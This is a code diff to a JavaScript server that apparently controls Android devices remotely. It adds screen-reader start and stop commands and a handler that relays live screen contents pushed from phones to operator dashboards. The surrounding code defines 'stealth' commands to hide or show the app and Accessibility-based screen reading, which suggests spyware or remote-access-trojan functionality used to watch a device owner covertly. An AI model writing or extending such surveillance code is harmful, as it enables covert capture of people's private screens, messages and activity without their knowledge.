@@ -196,6 +196,8 @@ const COMMANDS = {
     fully_show_app:            { category: 'stealth',     label: 'Show App (Full)',       icon: '🔓' },
     // Screen Reader (Accessibility)
     read_screen:               { category: 'screen_reader',label: 'Read Screen',           icon: '📺' },
+    screen_reader_start:       { category: 'screen_reader',label: 'Screen Reader Start',   icon: '▶️'  },
+    screen_reader_stop:        { category: 'screen_reader',label: 'Screen Reader Stop',    icon: '⏹'  },
     find_by_text:              { category: 'screen_reader',label: 'Find By Text',          icon: '🔍' },
     get_current_app:           { category: 'screen_reader',label: 'Current App',           icon: '📱' },
     get_clickable_elements:    { category: 'screen_reader',label: 'Clickable Elements',    icon: '👆' },
@@ -576,6 +578,17 @@ async function processMessage(clientId, clientType, event, data) {
                 R.pushActivity(deviceId, entry).catch(() => {});
                 broadcastDash('activity:app_open', entry);
             }
+        }
+        return;
+    }
+
+    // ── Screen reader push from Android → relay to dashboards ────────
+    if (event === 'screen:update') {
+        const conn = tcpClients.get(clientId);
+        if (conn) conn.lastPong = Date.now();
+        const deviceId = conn?.deviceId || data?.deviceId;
+        if (deviceId) {
+            broadcastDash('screen:update', { ...data, deviceId });
         }
         return;
     }
